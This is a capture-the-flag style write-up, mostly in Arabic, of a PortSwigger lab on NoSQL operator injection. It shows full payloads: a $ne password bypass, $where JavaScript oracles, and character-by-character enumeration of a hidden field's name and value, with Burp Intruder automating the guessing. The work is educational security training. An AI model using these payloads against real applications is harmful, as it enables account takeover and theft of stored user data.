## Welcome My friends , Today we will attack this [Lab: Exploiting NoSQL operator injection to extract unknown fields](https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-nosql-operator-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-unknown-fields#)


### السلام عليكم ورحمة الله وبركاته ... اهلا وسهلا بك يا صديقي سوف نقوم بشرح تلك الغرفة باللغة العربية ويمكن تكون الغرفة الوحيدة التي سيتم شرحها باللغة العربية.

#### دعنا نبدا في اللاب والسيناريو اعطانا اسم مستخدم وهو carlos ويطلب مننا نقوم بالدخول على حساب تلك الهدف 


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/650b017b-7441-4db8-ae63-7a62a18968cc)


#### في الحقيقة تلك الغرفة مليئة بالمعلومات فركز معنا يا صديقي :) لنبدأ على بركة الله...

### الان سوف نذهب لنعترض صحفة تسجيل الدخول ونقوم بحقنه باكواد ضارة 

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/80a3e5b8-897e-499f-91d1-0ef80d7ff35b)


#### نحن لا نعرف كلمة المرور في تلك الغرفة نحن لا نبحث عن تلك المرور بل نبحث عن حقول مخفية مثل username و password وليكن email حقل مخفي ونبحث لو كانت تلك الحقول تمتلك بيانات يمكنها مساعدتنا مثل token 

### الان سوف نحاول مع تلك الحمولة ونرى ماذا سينتج من خلاله :



```
{"username":"carlos","password":{"$ne":"hi"}}
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/7d001e29-53cf-4921-8a5b-daff4195bef5)

#### لاحظ يا صديقي هنا لقد نجح الحمولة والدليل على ذلك ظهور رسالة مختلفة ```Account locked``` هنا نفهم 
#### الحمولة صحيحة تظهر رسالة ``` Account locked``` واذا كانت الحمولة غير صحيحة تظهر رسالة ```invalid username or password```
    

##### اذا نريد نتاكد اكثر نستخدم تلك الحمولات القادمة
```
,"$where": "0"
```

or 

```
,"$where":"function(){return 0;}"
```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/d8cca859-dff8-4ba4-bebb-95c206a838da)

##### 0 يعني غلط و 1 يعني صح



```
,"$where": "1"
```

or 

```
,"$where":"function(){return 1;}"
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/db532663-d40a-4c8e-91c7-361f6b237b60)


##### غيرناها ل 1 ظهرت لنا رسالة تخبرنا انها صحيحة

### والان نتاكد من الحقول التي لدينا وايضا نحاول اكتشاف الحقول المخفية
#### الحقول التي نعرفها هم ```username,password,_id```

```
,"$where":"function(){ if(Object.keys(this)[2].match('password')) return 1; else 0;}"
```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/c15d7999-8b5f-4417-9072-b2c138992d4b)

##### هنا نعرف ان الحقل الثالث هو password 
##### هي نختبر عدد الحقول المخفية

```
,"$where":"function(){ if(Object.keys(this)[3].match('password')) return 1; else 0;}"
```

![Screenshot from 2024-07-11 05-05-15](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/4df37290-1ee3-47ba-9b3d-e4112273587f)


##### لدينا حقل مخفي ترتيبه الرابع لنعيد نفس الحمولة مره اخرى ونغير الرقم ل 4 ونرى النتيجة 


```
,"$where":"function(){ if(Object.keys(this)[4].match('password')) return 1; else 0;}"
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/831b1212-209c-47a8-9aca-b74643dde653)

##### والان لا يوجد حقل اخر 
##### نحن نريد نعرف شيئين الاول ما هو اسم الحقل الرابع ؟ وما هو القيمة التي بداخله؟

### الاول دعنا نبحث عن اسم الحقل الرابع المخفي:

##### نريد نعرف كم عدد حروف الاسم ثانيا نبدا نخمن الحروف لنبدا بتخمين عدد الحروف


```
,"$where":"function(){ if(Object.keys(this)[3].length==1) return 1; else 0;}"
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/137af26f-5c42-4772-bd90-382f8831724f)

##### لم تكن عدد الحروف حرف واحد والان سيصبح الامر مملا اذا كنا نخمن رقم ثم رقم دعنا نستخدم ```intruder``` :


```
,"$where":"function(){ if(Object.keys(this)[3].length==5) return 1; else 0;}"
```

[Screencast from 2024-07-11 05:13:47 AM.webm](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/9cccb2fb-4486-4e7e-bd4a-7d88b25cc7ba)



##### والان عرفنا ان عدد الحروف هو ```5``` حروف 

### والان نريد نخمن الحروف الخمس سنستخدم تلك الحمولة


```
,"$where":"function(){ if(Object.keys(this)[3].match(/^a/)) return 1; else 0;}"
```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/6be352ab-2595-4160-830a-59547a3e5912)

##### لم تكن اول حرف a والان سيصبح الامر مملا اذا كنا نخمن حرف ثم حرف دعنا نستخدم ```intruder``` :


[Screencast from 2024-07-11 05:24:26 AM.webm](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/e31b85a7-c120-429b-ab8a-b0e62791557b)

#### Hidden Field is email.

##### والان نريد قيمة email سوف نستخدم تلك الحمولات التي استخدمناهم من قبل الحمولة الاولى لكي نعرف عدد حروف القيمة والثاني لكي نخمن تلك الحروف

```
,"$where":"function(){ if(this.email.length == 1) return 1; else 0;}"
```



[Screencast from 2024-07-11 05:34:04 AM.webm](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/c5fb9a34-2d0e-4d26-b6a0-80efc02eeddf)

#### Length is 25

#### والان سوف نخمن تلك الحروف ال 25 حرف

```
,"$where":"function(){ if(this.email.match(/^a/)) return 1; else 0;}"
```

#### Email is carlos@carlos-montoya.net











































































































